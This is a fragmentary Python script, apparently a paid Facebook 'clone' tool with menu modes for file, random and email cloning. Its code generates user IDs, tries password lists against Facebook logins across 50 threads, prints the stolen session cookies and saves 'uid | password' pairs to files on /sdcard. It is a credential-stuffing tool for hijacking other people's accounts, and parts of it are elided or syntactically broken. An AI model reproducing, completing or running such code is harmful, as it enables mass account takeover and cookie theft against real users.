...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[OMI-XD')
...
\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : OMI HASAN 
\033[1;32m  GITHUB    :OMIdark
\033[1;32m  FACEBOOK  : ছো্ঁট্ঁ ন্ঁবা্ঁব্ঁ 
\033[1;32m  TOOL NAME : FILE CLONE
\033[1;32m  TOOL TYPE : PAID
\033[1;32m  VERSION   : 3.3
\033[1;32m---------------------------------------------------------
"""  )
...
#OMI_NAME=input(f'\033[1;92m[\033[1;31m\033[1;92m]\033[0;92m YOUR NAME :\x1b[1;96m ')
#--------------------[ BAGIAN-MASUK ]--------------#
...
def menu():
	...
	_OMI_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_OMI_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_OMI_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_OMI_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_OMI_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____OMI_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____OMI_____ in ['1']:
		C1()
	if _____OMI_____ in ['2']:
		Y2()
	if _____OMI_____ in ['3']:
		BER()
	if _____OMI_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100000448332183")
	if _____OMI_____ in ['0']:
		exit()
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(OMI_NAME))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#open('/sdcard/'+OMI-file clone,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as OMI:
        clear()
        tl = str(len(user))      
        ...
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
               ...
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    ...
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[OMI.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
    ...
    try:
        for ps in pwv:
            ...
            if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mOMI-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/ARIYAN-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
